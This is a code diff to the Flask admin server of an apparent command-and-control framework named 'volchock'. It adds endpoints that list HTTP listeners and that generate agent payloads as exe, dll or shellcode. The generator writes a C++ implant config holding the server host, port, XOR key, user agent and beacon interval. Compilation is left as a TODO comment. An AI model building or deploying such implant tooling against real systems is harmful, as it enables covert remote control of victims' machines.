@@ -5,18 +5,21 @@
 from flask import Flask, request, jsonify
 from functools import wraps
 from queue import Queue
+import sys, os, json
+from teamserver.listener.http_listener import HttpListener
 from teamserver.logger.CustomLogger import CustomLogger
 log = CustomLogger("volchock-admin")
 
 class AdminServer:
-    def __init__(self, port, users_dict, shared_req_queue, auth_required=True, agent_handler=None, xor_key=None):
+    def __init__(self, port, users_dict, listeners, shared_req_queue, auth_required=True, agent_handler=None, xor_key=None):
         self.port = port
-        self.users = users_dict or {}
+        self.users = users_dict
         self.auth_required = auth_required
         self.shared_req_queue = shared_req_queue
         self.agent_handler = agent_handler
         self.xor_key = xor_key
         self.connected_users = []
+        self.listeners = listeners
         self.app = Flask(__name__)
         self.add_endpoints()
 
@@ -119,6 +122,86 @@ class AdminServer:
                 res = self.agent_handler.pop_agent_results(agent_id)
                 return jsonify({"results": res})
             return jsonify({"results": []})
+
+
+        @self.app.route('/listeners', methods=['GET'])
+        @self.require_auth
+        def get_listeners():
+            res = []
+            for listener in self.listeners:
+                if isinstance(listener, HttpListener):
+                    res.append(f"""
+{listener.name} 
+    Type : HttpListener
+    Host : {listener.host}
+    Port : {listener.port}
+
+""")
+            return jsonify({"listeners": res})
+
+
+
+        def get_profile_props(profile_name):
+            profiles = [
+                os.path.join(os.path.dirname(__file__), "..", "profiles", "volchock.profile"),
+            ]
+            for profile_path in profiles:
+                if not os.path.exists(profile_path):
+                    log.error(f"[!] Listener profile not found: {profile_path}")
+                    continue
+                with open(profile_path, "r", encoding="utf-8") as fp:
+                    profiles_cfg = json.load(fp)
+                for profile_cfg in profiles_cfg:
+                    name = profile_cfg.get("name")
+                    if name is None:
+                        log.error(f"[!] Name not specified in profile: {profile_path}")
+                    if name == profile_name:
+                        host = profile_cfg.get("host")
+                        port = profile_cfg.get("port")
+                        xor_key = profile_cfg.get("xor_key")
+                        user_agent = profile_cfg.get("user_agent")
+                        uri_first_path = profile_cfg.get("uri_paths")[0]
+                        http_headers = profile_cfg.get("http_headers", {})
+                        header_lines = [f"{k}: {v}" for k, v in http_headers.items()]
+                        header_cstr = "\\n".join(header_lines)
+
+                        if host is None or port is None or xor_key is None or user_agent is None or uri_first_path is None or header_cstr is None:
+                            log.error(f"[!] A property is missing in profile: {profile_name}")
+                        new_agent_config = f"""
+#pragma once
+#include <string>
+constexpr char XOR_KEY[] = "{xor_key}";
+constexpr char VOLCHOCK_SERVER[] = "{host}";
+constexpr int VOLCHOCK_PORT = {port};
+constexpr char USER_AGENT[] = "{user_agent}";
+constexpr char HEADER[] = "{header_cstr}";
+constexpr char RESULTS_PATH[] = "{uri_first_path}";
+constexpr int BEACON_INTERVAL = 5;
+"""
+                        print(new_agent_config)
+                        # mettre à jour config.h et lance la compil puis renvoyer en base64 le contenu de l'agent
+
+
+
+            return jsonify({"results": "An unexpected error occured in get_profile_props function."})
+
+
+        @self.app.route('/generate/<listener_name>/<payload_type>', methods=['GET'])
+        @self.require_auth
+        def generate(listener_name, payload_type):
+            for listener in self.listeners:
+                if listener.name == listener_name:
+                    if payload_type == "exe":
+                        print("payload type is exe")
+                        return get_profile_props("http")
+                    elif payload_type == "dll":
+                        print("payload type is dll")
+                    elif payload_type == "shellcode":
+                        print("payload type is shellcode")
+                    else:
+                        return jsonify({"results": "Incorrect payload type. Choose between \"exe\", \"dll\" or \"shellcode\"."})
+            return jsonify({"results": "No listener with that name"})
+
 
     def start(self):
         log.info(f"[+] Admin server started on port {self.port}")
